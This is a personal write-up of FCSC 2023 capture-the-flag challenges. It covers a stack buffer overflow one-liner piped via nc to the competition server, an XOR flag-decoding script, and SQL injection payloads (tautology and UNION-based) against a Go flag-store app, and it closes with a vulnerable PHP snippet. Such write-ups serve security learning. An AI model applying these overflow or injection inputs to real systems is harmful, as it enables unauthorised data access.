I participated in the [FCSC](https://france-cybersecurity-challenge.fr) for the second time this year. The first time was in 2019 and this I wanted to do better than the previous year. Before starting the CTF I hadn't done any CTF for a while or any cybersecurity related activities so it was a good way to get back into it. 
This post will mostly be useful for myself and also be a write-up for the challenges I have solved and found interesting. 

> Note that I mainly focused on web challenges as I am more comfortable with this type of challenge. I also did a few others.

## Intro - UUID
### Generalities
This challenge was the second one I did and I completed it way faster than I expected. 
The only thing that was given was a binary file. I started by running `file` on it to see what it was. 
```bash
❯ file  FCSC2023/pwn-uid/uid
FCSC2023/pwn-uid/uid: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cbb3387e82ca3a751e8b9d6bafec0f2e1c342af0, for GNU/Linux 3.2.0, not stripped
```

As I was thinking, this looked like a pwn challenge. This isn't at all what I'm comfortable with yet, but I wanted to give it a try.

### Analysis

The first step was to open it with `cutter` to see what was happening inside. And here the C code was pretty clear.
```c
undefined8 main(void)
{
    int64_t var_38h;
    uint64_t var_ch;
    
    var_ch._0_4_ = geteuid();
    printf("username: ");
    fflush(_stdout);
    __isoc99_scanf(data.0000200f, &var_38h);
    if ((int32_t)var_ch == 0) {
        system("cat flag.txt");
    } else {
        system("cat flop.txt");
    }
    return 0;
}
```
The program is pretty simple: it gets the user id and then asks for a username. If the user id is 0, it will print the `flag.txt`; otherwise it will print `flop.txt`.
At this point, I knew I would have to create a simple buffer overflow to change the user id to 0.
> In fact, you can have a UID equal to 0 on a machine. It just means that you are the root user. Unfortunately, I didn't know that at the time.
> Plus, you're not root on the server, so you can't read the flag.

So I started by looking at the `scanf` function. I knew that it was vulnerable to buffer overflow, so I had to find the destination buffer size to make it overflow.
After reading the pseudo-code and drawing my experience (I did a few buffer overflow and used a bit of `cutter`), I found that:
- The buffer is at `@ stack - 0x38` (0x38 = 56).
- A local variable is at `@ stack - 0xc` (0xc = 12).
Knowing this, the buffer size is 56 - 12 = 44. So, I had to send 44 characters to make it overflow !  
(To be fully honest I used the decompiled code to find the buffer size and the local variable size. It's easier to read than the assembly code)
```asm
int main (int argc, char **argv, char **envp);
; var int64_t var_38h @ stack - 0x38
; var uint64_t var_ch @ stack - 0xc
0x00001175      push    rbp
0x00001176      mov     rbp, rsp
0x00001179      sub     rsp, 0x30
0x0000117d      call    geteuid    ; sym.imp.geteuid ; uid_t geteuid(void)
0x00001182      mov     dword [var_ch], eax
0x00001185      lea     rdi, str.username: ; 0x2004 ; const char *format
0x0000118c      mov     eax, 0
0x00001191      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x00001196      mov     rax, qword stdout ; obj.__TMC_END
                                   ; 0x4050
0x0000119d      mov     rdi, rax   ; FILE *stream
0x000011a0      call    fflush     ; sym.imp.fflush ; int fflush(FILE *stream)
0x000011a5      lea     rax, [var_38h]
0x000011a9      mov     rsi, rax
0x000011ac      lea     rdi, data.0000200f ; 0x200f ; const char *format
0x000011b3      mov     eax, 0
0x000011b8      call    __isoc99_scanf ; sym.imp.__isoc99_scanf ; int scanf(const char *format)
0x000011bd      cmp     dword [var_ch], 0
0x000011c1      jne     0x11d1
0x000011c3      lea     rdi, str.cat_flag.txt ; 0x2012 ; const char *string
0x000011ca      call    system     ; sym.imp.system ; int system(const char *string)
0x000011cf      jmp     0x11dd
0x000011d1      lea     rdi, str.cat_flop.txt ; 0x201f ; const char *string
0x000011d8      call    system     ; sym.imp.system ; int system(const char *string)
0x000011dd      mov     eax, 0
0x000011e2      leave
0x000011e3      ret
0x000011e4      nop     word cs:[rax + rax]
0x000011ee      nop
```

### The exploit
We are going to create a really simple exploit. We will send 44 characters to the program, plus `\x00` to overwrite the local variable and make it equal to 0.  
This way, we go inside the `if` statement and we can read the flag.
```bash
python3 -c 'print("A"*44 + "\x00")' | nc challenges.france-cybersecurity-challenge.fr 2100
```
And there we go, we have the flag !

## Intro - La gazette de windows
This challenge was pretty easy. You were given a `.evtx` file and find the flag inside.
After converting the `.evtx` file to `.xml` with `evtxdump.py`, I found the following event:

As we can see, the flag is encrypted with a XOR cipher. The key is the position of the character in the string. 
Therefore, the solution was to code a simple script to decrypt the flag.
```python
l = [0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D]
s = ""
for i in range(len(l)):
    s += chr(l[i] ^ i)

print(s)
```
And there is the flag !

## Intro - Comparaison
This challenge wasn't really hard, but I found it really interesting. The goal was to create a simple pseudo-assembly code to compare two values and store the result in a variable.
> The assembly documentation is available [here](https://france-cybersecurity-challenge.fr/vm).

The asm code is ran by a python code that simulate a machine. We were given three things:
- `machine.py` which is the machine simulator
- `challenge.py` which is the code on the server to test our code
- `assembly.py` which is the code to convert our asm code to binary code

The first thing I did was to understand how the machine works. The two inputs were stored in `R5` and `R6`, the result was expected in `R0` to be 1 if equals, else 0.

So, here is the solution I wrote:
```asm
CMP R5, R6 ; compare R5 and R6, set Z if equals
JNZA neq ; if Z is not set, jump to neq
MOV R0, #0 ; set R0 to 0
STP ; stop the program

neq:
    MOV R0, #1 ; set R0 to 1
    STP ; stop the program
```
And this was it.
## Web - ENISA Flag Store 1/2
This challenge was about a flag store. We were given a website and its source code in `Go`. The website was storing in a postgre database flags from hacking teams and we were given a token access to create an account and access France's flag. The goal: steal a flag from another team.

First, I attempted to create an account and access the flag. I was able to create it and access the french team flags, but I couldn't find a way to steal the flag from another team. So I decided to look at the code source.

What I noticed right away was that there is a possibility for an SQL injection:
```go
func getData(user User) ([]Flag, error) {
	var flags []Flag

	req := fmt.Sprintf(`SELECT ctf, challenge, flag, points
                        FROM flags WHERE country = '%s';`, user.Country)
	rows, err := db.Query(req)
	if err != nil {
		return flags, err
	}
	defer rows.Close()

	for rows.Next() {
		var flag Flag
		err = rows.Scan(&flag.CTF, &flag.Challenge, &flag.Flag, &flag.Points)
		if err != nil {
			return flags, err
		}
		flags = append(flags, flag)
	}
	if err = rows.Err(); err != nil {
		return flags, err
	}

	return flags, nil
}
```

Formating a SQL query string using `sprintf` from an input is something smelly. So, I was convinced that the solution was here. Yet, I had to read more of the code to understand how to exploit it.

And the second thing I noticed was the `CheckToken` function:
```go
func CheckToken(country string, token string) bool {

	stmt, err := db.Prepare(`SELECT id FROM country_tokens
                             WHERE country = SUBSTR($1, 1, 2)
                             AND token = encode(digest($2, 'sha1'), 'hex')`)
	if err != nil {
		log.Fatal(err)
	}

	t := &Token{}
	err = stmt.QueryRow(country, token).Scan(&t.Id)
	if err != nil {
		return false
	}
	return true
}
```
This code only checks the coherence between the 2 first characters of the country and the token.
Which means, the country `FR hello boiiiii` with the token corresponding to the french team will be accepted.

From there, everything is pretty simple. During the registration, we intercept the request and change the country to `frlol' OR '1'='1`. By doing this:
- `OR '1'='1'` will always be true, so the request will return every flags in the flag table.
- the single quote on the second `1` will match the one already in the query.

We register, then login, and we have access to every flags!
## Web - ENISA Flag Store 2/2
This challenge is just the second part of the previous one. We have to steal an other flag in the system. Because I'm quite comfortable with SQL injections, I already knew that the solution was to use a `UNION` statement and because the databse is a postgre, I knew where to find the informations I was looking for. Therefore, no time to waste: 
`fr' UNION select tablename,'1','1','1' FROM pg_catalog.pg_tables;--`

By using this, we respect the length limit of the country and we can see the tables in the database. After a quick look, there is this strange table: `__s3cr4_t4bl3__`. 

After a bit of a thinking, I thought that there is only one column in this table and it's probably the flag. So, I tried this: `fr' UNION SELECT *,'1','1','1' FROM __s3cr4_t4bl3__;--` and it worked!
I got the flag!
> After checking other people solutions, I saw that there is a way to extract the database into XML and then extract the flag from it. I didn't know that, but it's a really cool way to do it!

## Web - Salty Authentication
```php
<?php

error_reporting(0);

include('flag.php');
$salt = bin2hex(random_bytes(12));

extract($_GET);

$secret = gethostname() . $salt;

if (isset($password) && strlen($password) === strlen($secret) && $password !== $secret) {
    if (hash('fnv164', $password) == hash('fnv164', $secret)) {
        exit(htmlentities($flag));
    } else {
        echo('Wrong password!');
        exit($log_attack());
    }
}

highlight_file(__FILE__);

?>
```
